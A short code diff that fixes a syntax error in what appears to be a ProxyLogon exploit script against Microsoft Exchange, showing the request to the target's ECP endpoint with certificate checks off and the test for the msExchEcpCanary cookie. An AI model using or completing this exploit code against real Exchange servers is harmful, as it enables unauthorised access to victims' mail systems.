@@ -95,7 +95,7 @@ ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                    data=proxyLogon_request,
                    verify=False
                    )
-if ct.status_code != 241 or not "msExchEcpCanary" in ct.headers["Set-Cookie"]::
+if ct.status_code != 241 or not "msExchEcpCanary" in ct.headers["Set-Cookie"]:
     print("Proxylogon Error!")
     exit()
 
